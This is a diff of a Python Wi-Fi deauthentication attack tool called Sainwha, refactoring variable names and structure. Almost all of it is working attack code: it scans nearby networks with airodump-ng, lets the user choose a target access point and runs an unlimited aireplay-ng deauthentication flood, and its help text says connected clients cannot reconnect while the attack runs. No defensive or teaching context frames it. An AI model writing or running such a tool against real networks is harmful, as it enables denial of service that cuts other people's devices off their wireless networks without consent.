@@ -21,8 +21,7 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
-
-# Code version SEX26JAN012024
+# Code version TER26MAR032024
 
 # Importa as libs necessarias
 import os
@@ -34,48 +33,59 @@ import socket
 import readline
 import threading
 import subprocess
-
+# Variaveis de funcionamento
+# Variaveis de exibicao e informacao
+# INTERFACE: Network Adapter
+# network: Network Name
+# CHANNEL: Network Channel
+# BSSID: Network MAC
+# Variaveis de funcionamento
+netCards = []
+# Retorna tudo a None e false
+netCard = None
+network = None
+channel = None
+bssid = None
+intHasSet = 'false'
+netHasSet = 'false'
+# Arquivo temporario
+currentFolder = os.getcwd()
+tempFolder = currentFolder + "/temp"
+if not os.path.exists(tempFolder):
+    os.makedirs(tempFolder)
 # Definicao de cores
 def colors():
     # Nomes das cores de acordo com a formatacao do terminal Linux
     # Se estiver em outro tema, como Kali-Dark ou variantes, as cores podem mudar e nao corresponderem ao nome
-    global white, red, green, black, silver
-    white = '\033[0;97m'
-    red = '\033[0;91m'
-    green = '\033[0;92m'
-    black = '\033[0;90m'
-    silver = '\033[0;89m'
+    global colorWhite, colorRed, colorGreen, colorBlack, colorSilver
+    colorWhite = '\033[0;97m'
+    colorRed = '\033[0;91m'
+    colorGreen = '\033[0;92m'
+    colorBlack = '\033[0;90m'
+    colorSilver = '\033[0;89m'
 colors()
-
 # Verifica se usuario esta em modo root
-def verify_root():
-    if os.geteuid() == 0:
-        return True
-    else:
-        print(f"{red} > {white}Execute as root!")
-        sys.exit()
-verify_root()
-
+if os.geteuid() == 0:
+    pass
+else:
+    print(f"{colorRed} > {colorWhite}Execute as root!")
+    sys.exit()
 # Verifica se as ferramentas necessarias estao instaladas
-def check_tool_installed(tool_name):
-    if tool_name == 'net-tools':
+def check_tools(toolName):
+    if toolName == 'net-tools':
         return os.path.exists('/sbin/ifconfig')
     else:
-        return shutil.which(tool_name) is not None
-
-def initializing_sainwha():
-    subprocess.call('clear')
-    tools_to_check = ['aircrack-ng', 'net-tools']
-    not_installed_tools = []
-    for tool in tools_to_check:
-        if not check_tool_installed(tool):
-            not_installed_tools.append(tool)
-    if not_installed_tools:
-        for tool in not_installed_tools:
-            print(f"{red} > {black}{tool} {white}not installed. To install, use '{green}sudo apt install {tool}{white}'.")
-            sys.exit()
-initializing_sainwha()
-
+        return shutil.which(toolName) is not None
+subprocess.call('clear')
+toolsCheck = ['aircrack-ng']
+notInstalled = []
+for tool in toolsCheck:
+    if not check_tools(tool):
+        notInstalled.append(tool)
+if notInstalled:
+    for tool in notInstalled:
+        print(f"{colorRed} > {colorBlack}{tool} {colorWhite}not installed. To install, use '{colorGreen}sudo apt install {tool}{colorWhite}'.")
+        sys.exit()
 # Verifica se o usuario esta conectado a internet
 def check_network_connection():
     try:
@@ -86,360 +96,291 @@ def check_network_connection():
     return False
 if check_network_connection():
     subprocess.run("clear")
-    print(f"{red} > {white}Please start sainwha without {black}being connected to a internet{white}.")
+    print(f"{colorRed} > {colorWhite}Please start sainwha without {colorBlack}being connected to a internet{colorWhite}.")
     sys.exit()
 else:
-    exit_script = False
-
+    abortProgram = False
 # Verifica se o usuario se conectou a internet
 def check_internet():
-    while not exit_script:
+    while not abortProgram:
         try:
-            subprocess.run(["ping", "-c", "1", "google.com"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+            subprocess.run(["ping", "-c", "1", "google.com"], 
+                           stdout=subprocess.PIPE, 
+                           stderr=subprocess.PIPE, 
+                           check=True)
         except subprocess.CalledProcessError:
             pass 
         else:
             subprocess.run("clear")
-            print(f"{red} > {white}{black}Do not activate the internet {white}while using sainwha.") 
+            print(f"{colorRed} > {colorWhite}{colorBlack}Do not activate the internet {colorWhite}while using sainwha.") 
             os._exit(0)
         time.sleep(0.1) 
-internet_thread = threading.Thread(target=check_internet)
-internet_thread.start()
-
-# Variaveis de funcionamento
-def global_variables():
-    # Variaveis de exibicao e informacao
-    # INTERFACE: Network Adapter
-    # network: Network Name
-    # CHANNEL: Network Channel
-    # BSSID: Network MAC
-    global interface, network, channel, bssid
-
-    # Variaveis de definicao 
-    global set_network, set_interface
-
-    # Arquivo temporario
-    global tempfolder
-
-    # Retorna tudo a None e false
-    interface = None
-    network = None
-    channel = None
-    bssid = None
-
-    set_interface = 'false'
-    set_network = 'false'
-global_variables()
-
-# Remove o arquivo temporario
-def temp_folder():
-    global tempfolder
-    current_directory = os.getcwd()
-    tempfolder = current_directory
-    os.chdir(tempfolder)
-    for archive in os.listdir(tempfolder):
-        if archive == "sainwha-01.csv":
-            archive_path = os.path.join(tempfolder, archive)
-            os.remove(archive_path)
-temp_folder()
-
+internetThread = threading.Thread(target=check_internet)
+internetThread.start()
+# Comandos do subprocess
+def write_net(netCardProcess, scanTimeProcess):
+    print(f"{colorGreen} > {colorWhite}Scanning... please wait for '{colorGreen}{scanTimeProcess}{colorWhite}' seconds")
+    writeNetProcess = subprocess.Popen(
+        f"airodump-ng -w {tempFolder}/netList --write-interval 1 --output-format csv {netCardProcess}", 
+        shell=True, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE, 
+        stdin=subprocess.PIPE)
+    time.sleep(scanTimeProcess)
+    writeNetProcess.terminate()
+    writeNetProcess.wait()
+def attack_net(netCardProcess):
+    # Define a rota ate a colorRede
+    global network, bssid, channel
+    print(f"\n{colorGreen} > {colorWhite}Starting attack on '{colorGreen}{network}{colorWhite}' channel '{colorGreen}{channel}{colorWhite}'...")
+    airodumpProcess = subprocess.Popen(f"airodump-ng --bssid {bssid} --channel {channel} {netCard} > /dev/null 2>&1", shell=True)
+    time.sleep(0.5)
+    os.kill(airodumpProcess.pid, 2)
+    # Inicia o envio de pacotes
+    print(f"{colorBlack} > {colorWhite}Attack started. Press '{colorGreen}Ctrl+C{colorWhite}' to stop")
+    subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} {netCardProcess} > /dev/null 2>&1", shell=True)
+    print(f"{colorRed} > {colorWhite}Unknown error{colorWhite}")
+    os._exit(1)
+def remove_temp_folder():
+    netListFile = "netList-01.csv"
+    fileRemove = os.path.join(tempFolder, netListFile)
+    if os.path.exists(fileRemove):
+        os.remove(fileRemove)
+remove_temp_folder()
 # Definir o interface
 # Exibe uma lista de interface para o usuario escolher                
-def cmd_set_interface():
-    global interface
-    global set_interface
-
+def set_network_card():
     # Escaneia os interfaces disponiveis
-    def network_cards():
-        try:
-            result = subprocess.check_output(["iw", "dev"])
-            result_str = result.decode("utf-8")
-            cards = []
-            lines = result_str.split("\n")
-            for line in lines:
-                if "Interface" in line:
-                    card_name = line.replace("Interface", "").strip()
-                    cards.append(card_name)
-            return cards
-        except subprocess.CalledProcessError:
-            print(f"{red} > {white}'iw dev' not executed")
-            print('')
-    network_cards()
-
+    try:
+        result = subprocess.check_output(["iw", "dev"])
+        resultString = result.decode("utf-8")
+        lines = resultString.split("\n")
+        for line in lines:
+            if "Interface" in line:
+                cardName = line.replace("Interface", "").strip()
+                netCards.append(cardName)
+    except subprocess.CalledProcessError:
+        print(f"{colorRed} > {colorWhite}'iw dev' not executed")
+        print()
     # Exibe as informacoes na tela
     # O usuario ira escolher o interface
-    def scan_interface():
-        global scan_interface_process
-        global cards
-        cards = network_cards()
-        if not cards:
-            print(f"{red} > {white}No network adapters available\n")
-            return None
-        for card in cards:
-            print(f"{green} > {white}Availables interfaces:")
-            print(f"{green} . {white}{card}\n")
-            scan_interface_process = 'true'
-    scan_interface()
+    if not netCards:
+        print(f"{colorRed} > {colorWhite}No network adapters available\n")
+    for card in netCards:
+        print(f"{colorGreen} > {colorWhite}Availables interfaces:")
+        print(f"{colorGreen} . {colorWhite}{card}\n")
     try:
         while True:
             try:
-                interfacei = input(f"{black} > {white}Set interface > ")
+                changeInterface = input(f"{colorBlack} > {colorWhite}Set interface > ")
             except KeyboardInterrupt:
-                print(f"\n {red}> {white}Interface has not set\n")
+                print(f"\n {colorRed}> {colorWhite}Interface has not set\n")
                 main()
-            if interfacei in cards:
-                interface = interfacei
-                set_interface = 'true'
-                print(f"{green} > {white}interface set to '{green}{interface}{white}'\n")
+            if changeInterface in netCards:
+                global intHasSet
+                intHasSet = 'true'
+                global netCard
+                netCard = changeInterface
+                print(f"{colorGreen} > {colorWhite}interface set to '{colorGreen}{netCard}{colorWhite}'\n")
                 main()
                 break
             else:
-                print(f"{red} > '{black}{interfacei}{white}' Does not match a valid interface\n")
+                print(f"{colorRed} > '{colorBlack}{changeInterface}{colorWhite}' Does not match a valid interface\n")
     except KeyboardInterrupt:
         print('\n')
         main()
-
 # Definir o network
-# Exibe uma lista de network (redes) para o usuario escolher        
-def cmd_set_network_part1():
-    if set_interface == 'true':
+# Exibe uma lista de network (colorRedes) para o usuario escolher        
+def set_network_to_attack():
+    if intHasSet == 'true':
         try:
-            # Define o tempo que o escaneamento de rede sera feito
-            def set_scanning_time():
-                global scanning_time
+            # Define o tempo que o escaneamento de colorRede sera feito
+            def scan_time():
                 try:
                     while True:
                         try:
-                            iscanning_time = input(f"{black} > {white}Set scanning time (in seconds) > ")
+                            changeTime = input(f"{colorBlack} > {colorWhite}Set scanning time (in seconds) > ")
                         except KeyboardInterrupt:
-                            print(f"\n {red}> {white}Network has not set\n")
+                            print(f"\n {colorRed}> {colorWhite}Network has not set\n")
                             main()
-                        if iscanning_time.isdigit():
-                            scanning_time = float(iscanning_time)
+                        if changeTime.isdigit():
+                            global scanTime
+                            scanTime = float(changeTime)
                             break
                         else:
-                            print(f"{red} > {white}Enter a number!\n")
+                            print(f"{colorRed} > {colorWhite}Enter a number!\n")
                 except KeyboardInterrupt:
                     print('\n\n')
                     main()
-            set_scanning_time()
-
-            # Escaneia as redes proximas e exibe as informacoes
-            def cmd_set_network_part2():
-                global network
-                global bssid
-                global channel
-                global scanning_time
-                global set_network
-
-                # Informacoes gravadas no arquivo temporario
-                process = subprocess.Popen(f"airodump-ng -w {tempfolder}/sainwha --write-interval 1 --output-format csv {interface}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                print(f"{green} > {white}Scanning... please wait for '{green}{scanning_time}{white}' seconds")
-                time.sleep(scanning_time)
-                process.terminate()
-                process.wait()
-                network_data = []
-                networks = []
-
-                # Le as informacoes do arquivo temporario e grava nas variaveis correspondentes
+            scan_time()
+            # Escaneia as colorRedes proximas e exibe as informacoes
+            # Informacoes gravadas no arquivo temporario
+            write_net(netCard, scanTime)
+            global netData, netList
+            netData = []
+            netList = []
+            # Le as informacoes do arquivo temporario e grava nas variaveis correspondentes
+            try:
+                with open(f"{tempFolder}/netList-01.csv") as tempFile:
+                    csvFile = csv.reader(tempFile)
+                    for line in csvFile:
+                        if len(line) >= 15 and line[0].strip() != 'BSSID':
+                            viewBSSID = line[0].strip()
+                            viewNETWORK = line[13].strip()
+                            viewCHANNEL = line[3].strip()
+                            if viewNETWORK:
+                                netData.append((viewBSSID, viewNETWORK, viewCHANNEL))
+                                netList.append(viewNETWORK)
+                                remove_temp_folder()
+            except FileNotFoundError:
+                print(f"{colorRed} > {colorWhite}File not found\n")
+                main()
+            # Exibe as informacoes na tela    
+            if netData:
+                print(f"\n{colorGreen} > {colorWhite}Available networks:")
+                for viewBSSID, viewNETWORK, viewCHANNEL in netData:
+                    print(f"{colorGreen} . {colorWhite}{viewNETWORK}")
+                print()
+            else:
+                print(f"{colorRed} > {colorWhite}Networks not found\n")
+                main()
+            # Definir o network
+            while True:
                 try:
-                    with open(f"{tempfolder}/sainwha-01.csv") as arquivo_csv:
-                        writer_csv = csv.reader(arquivo_csv)
-                        for line in writer_csv:
-                            if len(line) >= 15 and line[0].strip() != 'BSSID':
-                                view_bssid = line[0].strip()
-                                view_network = line[13].strip()
-                                view_channel = line[3].strip()
-                                if view_network:
-                                    network_data.append((view_bssid, view_network, view_channel))
-                                    networks.append(view_network)
-                                    temp_folder()
-                except FileNotFoundError:
-                    print(f"{red} > {white}File not found\n")
-                    main()
-
-                # Exibe as informacoes na tela    
-                if network_data:
-                    print(f"\n{green} > {white}Available networks:")
-                    for view_bssid, view_network, view_channel in network_data:
-                        print(f"{green} . {white}{view_network}")
-                    print('')
-                else:
-                    print(f"{red} > {white}Networks not found\n")
-                    main()
-
-                # Definir o network
-                while True:
                     try:
-                        try:
-                            inetwork = input(f"{black} > {white}Set network > ")
-                        except KeyboardInterrupt:
-                            print(f"\n {red}> {white}Network has not set\n")
-                            main()
-                        if inetwork in networks:
-                            for chosen_bssid, chosen_network, chosen_channel in network_data:
-                                if chosen_network == inetwork:
-                                    network = chosen_network
-                                    channel = chosen_channel
-                                    bssid = chosen_bssid
-                                    print(f"{green} > {white}NETWORK set to '{green}{network}{white}'")
-                                    print(f"{green} > {white}CHANNEL set to '{green}{channel}{white}'")
-                                    print(f"{green} > {white}MAC set to '{green}{bssid}{white}'\n")
-                                    set_network = 'true'
-                            break
-                        else:
-                            print(f"{red} > '{black}{inetwork}{white}' Does not match a valid network\n")
+                        changeNet = input(f"{colorBlack} > {colorWhite}Set network > ")
                     except KeyboardInterrupt:
-                        print('\n')
+                        print(f"\n {colorRed}> {colorWhite}Network has not set\n")
                         main()
-            cmd_set_network_part2()
+                    if changeNet in netList:
+                        for chosedBSSID, chosedNETWORK, chosedCHANNEL in netData:
+                            if chosedNETWORK == changeNet:
+                                global network, bssid, channel
+                                network = chosedNETWORK
+                                channel = chosedCHANNEL
+                                bssid = chosedBSSID
+                                print(f"{colorGreen} > {colorWhite}NETWORK set to '{colorGreen}{network}{colorWhite}'")
+                                print(f"{colorGreen} > {colorWhite}CHANNEL set to '{colorGreen}{channel}{colorWhite}'")
+                                print(f"{colorGreen} > {colorWhite}MAC set to '{colorGreen}{bssid}{colorWhite}'\n")
+                                global netHasSet
+                                netHasSet = 'true'
+                        break
+                    else:
+                        print(f"{colorRed} > '{colorBlack}{changeNet}{colorWhite}' Does not match a valid network\n")
+                except KeyboardInterrupt:
+                    print('\n')
+                    main()
         except KeyboardInterrupt:
             print('\n\n')
             main()
     else:
-        print(f"{red} > {white}Interface has not set. Use '{green}set interface{white}'\n")
-
+        print(f"{colorRed} > {colorWhite}Interface has not set. Use '{colorGreen}set interface{colorWhite}'\n")
 # Iniciar o ataque
 # Processo de envio de pacotes de desautentificacao
-def cmd_start():
-    if set_network == 'true':
-        global interface
-        global network
-        global channel
-        global bssid
+def start_attack():
+    if netHasSet == 'true':
         try:            
-            # Define a rota ate a rede
-            print(f"\n{green} > {white}Starting attack on '{green}{network}{white}' channel '{green}{channel}{white}'...")
-            airodump_process = subprocess.Popen(f"airodump-ng --bssid {bssid} --channel {channel} {interface} > /dev/null 2>&1", shell=True)
-            time.sleep(0.5)
-            os.kill(airodump_process.pid, 2)
-
-            # Inicia o envio de pacotes
-            print(f"{black} > {white}Attack started. Press '{green}Ctrl+C{white}' to stop")
-            subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} {interface} > /dev/null 2>&1", shell=True)
-            print(f"{red} > {white}Unknown error{white}")
-            os._exit(1)
-
+            attack_net(netCard)
         except KeyboardInterrupt:
-            print(f"{green} > {white}Attack interrupted!\n")
+            print(f"{colorGreen} > {colorWhite}Attack interrupted!\n")
             main()
     else:
-        print(f"{red} > {white}Network has not set. Use '{green}set network{white}'\n")
-cmd_start()
-
+        print(f"{colorRed} > {colorWhite}Network has not set. Use '{colorGreen}set network{colorWhite}'\n")
+start_attack()
 # Exibe as opcoes
 # Aqui exibe as informacoes que precisam ser definidas e as que ja estao definidas
-def cmd_options():
-    print(f"""{black} > {white}Sainwha options:
+def options():
+    print(f"""{colorBlack} > {colorWhite}Sainwha options:
 
-INTERFACE: {green}{interface}{white}
+INTERFACE: {colorGreen}{netCard}{colorWhite}
 
-NETWORK: {green}{network}{white}\tCHANNEL: {green}{channel}{white}\tMAC: {green}{bssid}{white}
+NETWORK: {colorGreen}{network}{colorWhite}\tCHANNEL: {colorGreen}{channel}{colorWhite}\tMAC: {colorGreen}{bssid}{colorWhite}
 
-{black} > {white}To set INTERFACE, use '{green}set interface{white}', to set NETWORK, use '{green}set network{white}'
+{colorBlack} > {colorWhite}To set INTERFACE, use '{colorGreen}set interface{colorWhite}', to set NETWORK, use '{colorGreen}set network{colorWhite}'
 """)
-
-def cmd_help():
-    print(f"""{black} > {white}Sainwha help menu:
+def help():
+    print(f"""{colorBlack} > {colorWhite}Sainwha help menu:
           
-{black} > {white}Commands:
-    {black}set{white}    {green}interface{white}    or{white}    {green}int{white}    set a interface to scans
-    {black}set{white}    {green}network{white}      or{white}    {green}net{white}    set a network that will be scans
-    {green}start{white}                            {white}start sending deauth packets
+{colorBlack} > {colorWhite}Commands:
+    {colorBlack}set{colorWhite}    {colorGreen}interface{colorWhite}    or{colorWhite}    {colorGreen}int{colorWhite}    set a interface to scans
+    {colorBlack}set{colorWhite}    {colorGreen}network{colorWhite}      or{colorWhite}    {colorGreen}net{colorWhite}    set a network that will be scans
+    {colorGreen}start{colorWhite}                            {colorWhite}start sending deauth packets
 
-    {black}> {white}Other:
-       {green}options{white}    or{white}    {green}opt{white}          show all options to set
-       {green}help{white}       or{white}    {green}h{white}            show this help menu
-       {green}clear{white}      or{white}    {green}cls{white}          clear terminal
+    {colorBlack}> {colorWhite}Other:
+       {colorGreen}options{colorWhite}    or{colorWhite}    {colorGreen}opt{colorWhite}          show all options to set
+       {colorGreen}help{colorWhite}       or{colorWhite}    {colorGreen}h{colorWhite}            show this help menu
+       {colorGreen}clear{colorWhite}      or{colorWhite}    {colorGreen}cls{colorWhite}          clear terminal
 
- {green}How it works is simple, the program sends deauthentication{white}
- {green}packets to the network. Connected clients are deauthenticated and{white} 
- {green}cannot be reconnected unless the attack is stopped{white}
+ {colorGreen}How it works is simple, the program sends deauthentication{colorWhite}
+ {colorGreen}packets to the network. Connected clients are deauthenticated and{colorWhite} 
+ {colorGreen}cannot be reconnected unless the attack is stopped{colorWhite}
       
 """)
-
-# Interface sainwha
-# Baleiona santista SAAAAAANTOOOOOOOSSSS    
+# Interface sainwhaS  
 def interface_variables():
-    global interfacemenu
-
-    interfacemenu = (f"""{white}Sainwha - {green}Deauther{white} Attacker
-{black}-|{white} GitHub {green}https://github.com/yzee4/Sainwha{white}
+    global menuInterface
+    menuInterface = (f"""{colorWhite}Sainwha - {colorGreen}Deauther{colorWhite} Attacker
+{colorBlack}-|{colorWhite} GitHub {colorGreen}https://github.com/yzee4/Sainwha{colorWhite}
                                                  
-{black}           █████               ███               
- {black}      █████████████           █████            
- {black}S    ██████{silver}██████{black}█████        ███████          
-     █████████{silver}███████{black}██        ██████████       
- {black}A    ███████{silver}█████{black}███████        ██████████     
+{colorBlack}           █████               ███               
+ {colorBlack}      █████████████           █████            
+ {colorBlack}S    ██████{colorSilver}██████{colorBlack}█████        ███████          
+     █████████{colorSilver}███████{colorBlack}██        ██████████       
+ {colorBlack}A    ███████{colorSilver}█████{colorBlack}███████        ██████████     
     █  ████████████████████     █████████       
- {black}I  ███  ██████  ████████████████████           
- {black}   █████      ████████████████████             
- {black}N   ██████████████████████████████             
-      █{white}███████{black}████████████████████              
- {white}W{black}      {white}████████{black}█  {black}█████    {white}████{black}█               
- {black}         {white}███████{black}  ██████ {white}█████{black}                 
- {white}H{black}       █   {white}████{black}  ██████  {white}█{black}                    
- {black}       █████      {black}██████                       
- {white}A{black}                  █████                       
+ {colorBlack}I  ███  ██████  ████████████████████           
+ {colorBlack}   █████      ████████████████████             
+ {colorBlack}N   ██████████████████████████████             
+      █{colorWhite}███████{colorBlack}████████████████████              
+ {colorWhite}W{colorBlack}      {colorWhite}████████{colorBlack}█  {colorBlack}█████    {colorWhite}████{colorBlack}█               
+ {colorBlack}         {colorWhite}███████{colorBlack}  ██████ {colorWhite}█████{colorBlack}                 
+ {colorWhite}H{colorBlack}       █   {colorWhite}████{colorBlack}  ██████  {colorWhite}█{colorBlack}                    
+ {colorBlack}       █████      {colorBlack}██████                       
+ {colorWhite}A{colorBlack}                  █████                       
                     ████                        
- {white}coded by yzee4{black}     ███      {green}>{white} Linux theme{black}
+ {colorWhite}coded by yzee4{colorBlack}     ███      {colorGreen}>{colorWhite} Linux theme{colorBlack}
 
- {green}>{white} When running Sainwha your network card may {black}disable{white} the internet connection
-   If this happens, simply {green}restart your machine{white}
-
-{white}To see options, use '{green}options{white}'
+{colorWhite}To see options, use '{colorGreen}options{colorWhite}'
 """)
 interface_variables()
-
 # Exibe a interface
 def show_interface():
     subprocess.call('clear')
-    print(f'''{interfacemenu}{white}''') 
+    print(f'''{menuInterface}{colorWhite}''') 
 show_interface()
-
 # Menu de definicoes
 def main():
     try:
         while True:
-            userselect = input(f"{white}Sainwha{white} > ").strip()
-
+            userSelect = input(f"{colorWhite}Sainwha{colorWhite} > ").strip()
             # Definir o interface
             # Inicia o processo de definicao do interface (Network Adapter)
-            if userselect == "set interface" or userselect == "set int" or userselect == "interface" or userselect == "int":
-                cmd_set_interface()
-
+            if userSelect == "set interface" or userSelect == "set int" or userSelect == "interface" or userSelect == "int":
+                set_network_card()
             # Definir o network
             # Inicia o processo de definicao do interface (Network Name)
-            elif userselect == "set network" or userselect == "set net" or userselect == "network" or userselect == "net":
-                cmd_set_network_part1()
-
+            elif userSelect == "set network" or userSelect == "set net" or userSelect == "network" or userSelect == "net":
+                set_network_to_attack()
             # Inica o ataque
             # Inicia o processo de envio de pacotes de desautenticacao            
-            elif userselect == "start":
-                cmd_start()
-
+            elif userSelect == "start":
+                start_attack()
             # Exibe o menu de opcoes
-            elif userselect == "options" or userselect == "opt":
-                cmd_options()
-
+            elif userSelect == "options" or userSelect == "opt":
+                options()
             # Exibe o menu de ajuda
-            elif userselect == "help" or userselect == "h":
-                cmd_help()
-
+            elif userSelect == "help" or userSelect == "h":
+                help()
             # Limpa o console
-            elif userselect == "clear" or userselect == "cls":
+            elif userSelect == "clear" or userSelect == "cls":
                 subprocess.run("clear")
                 show_interface()
                 main()
-
             # Caso o comando usado nao seja reconhecido, exibe o erro
             else:
-                print(f"{red} > {white}Unknown command: {userselect}\n")
-
+                print(f"{colorRed} > {colorWhite}Unknown command: {userSelect}\n")
     # Sair do programa
     except KeyboardInterrupt:
-        print(f"\n{white}Copyright (c) 2023 yzee4")
+        print(f"\n{colorWhite}Copyright (c) 2023 yzee4")
         os._exit(0)
 main()
-
-
